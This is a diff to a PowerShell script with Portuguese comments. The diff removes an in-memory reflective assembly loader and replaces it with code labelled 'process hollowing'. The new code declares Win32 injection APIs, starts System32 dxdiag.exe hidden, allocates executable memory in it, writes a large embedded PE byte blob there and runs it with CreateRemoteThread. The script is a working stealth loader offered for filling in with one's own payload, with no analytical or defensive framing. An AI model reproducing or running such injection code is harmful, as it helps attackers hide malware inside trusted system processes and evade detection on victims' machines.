@@ -1,26 +1,43 @@
-# Carregar assembly na memória
-function Invoke-FilelessExecution {
-    param(
-        [byte[]]$AssemblyBytes
-    )
-    
-    # Carregar o assembly na memória
-    $Assembly = [System.Reflection.Assembly]::Load($AssemblyBytes)
-    
-    # Encontrar método de entrada
-    $EntryPoint = $Assembly.EntryPoint
-    
-    if ($EntryPoint -ne $null) {
-        # Criar parâmetros (normalmente null para aplicações GUI)
-        $Parameters = $null
-        
-        # Invocar o método principal
-        $EntryPoint.Invoke($null, @(,$Parameters))
-    }
-}
+# Process Hollowing no dxdiag.exe do System32
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
 
-# Exemplo de uso (substitua pelos bytes reais do seu programa)
-$ProgramBytes = [System.Convert]::FromBase64String("	0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 
+public class Hollow
+{
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+    
+    [DllImport("kernel32.dll")]
+    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint dwSize, out int lpNumberOfBytesRead);
+    
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    
+    [DllImport("kernel32.dll")]
+    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+    
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr hObject);
+    
+    [DllImport("ntdll.dll")]
+    public static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddress);
+}
+"@
+
+# SEUS BYTES AQUI (substitua pelos bytes do seu programa)
+$ShellcodeBytes = @(
+    	0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 
 	0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
 	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
 	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
@@ -9608,7 +9625,49 @@ $ProgramBytes = [System.Convert]::FromBase64String("	0x4D, 0x5A, 0x90, 0x00, 0x0
 	0xE4, 0xC4, 0x3A, 0x67, 0x40, 0x72, 0xD7, 0x4C, 0x9B, 0x9F, 0x54, 0xD6, 
 	0xB8, 0x7C, 0xC7, 0x98, 0x3C, 0x22, 0xC8, 0xB6, 0xA8, 0x28, 0x67, 0x56, 
 	0x65, 0x10, 0x4A, 0x30, 0x1D, 0x58, 0x8F, 0xF1, 0x30, 0xE9, 0xDE, 0x2D, 
-	0x72, 0xF7, 0xDA, 0x57, 0xFE, 0x00, 0x00, 0x00")
+	0x72, 0xF7, 0xDA, 0x57, 0xFE, 0x00, 0x00, 0x00
+)
 
-# Executar
-Invoke-FilelessExecution -AssemblyBytes $ProgramBytes
+try {
+    # Iniciar dxdiag suspenso
+    $dxdiagPath = "C:\Windows\System32\dxdiag.exe"
+    $StartupInfo = New-Object Diagnostics.ProcessStartInfo
+    $StartupInfo.FileName = $dxdiagPath
+    $StartupInfo.CreateNoWindow = $true
+    $StartupInfo.UseShellExecute = $false
+    
+    $Process = [Diagnostics.Process]::Start($StartupInfo)
+    Start-Sleep -Milliseconds 500
+    
+    # Abrir processo com acesso completo
+    $hProcess = [Hollow]::OpenProcess(0x1F0FFF, $false, $Process.Id)
+    
+    if ($hProcess -ne [IntPtr]::Zero) {
+        # Alocar memória para o shellcode
+        $mem = [Hollow]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$ShellcodeBytes.Length, 0x3000, 0x40)
+        
+        if ($mem -ne [IntPtr]::Zero) {
+            # Escrever shellcode na memória
+            $written = 0
+            $success = [Hollow]::WriteProcessMemory($hProcess, $mem, $ShellcodeBytes, [uint32]$ShellcodeBytes.Length, [ref]$written)
+            
+            if ($success) {
+                # Criar thread remota
+                $hThread = [Hollow]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+                
+                if ($hThread -ne [IntPtr]::Zero) {
+                    [Hollow]::WaitForSingleObject($hThread, 0xFFFFFFFF) | Out-Null
+                    [Hollow]::CloseHandle($hThread)
+                    Write-Host "Process Hollowing executado com sucesso!"
+                }
+            }
+        }
+        [Hollow]::CloseHandle($hProcess)
+    }
+    
+    # Terminar processo original
+    $Process.Kill()
+    
+} catch {
+    Write-Host "Erro: $($_.Exception.Message)"
+}
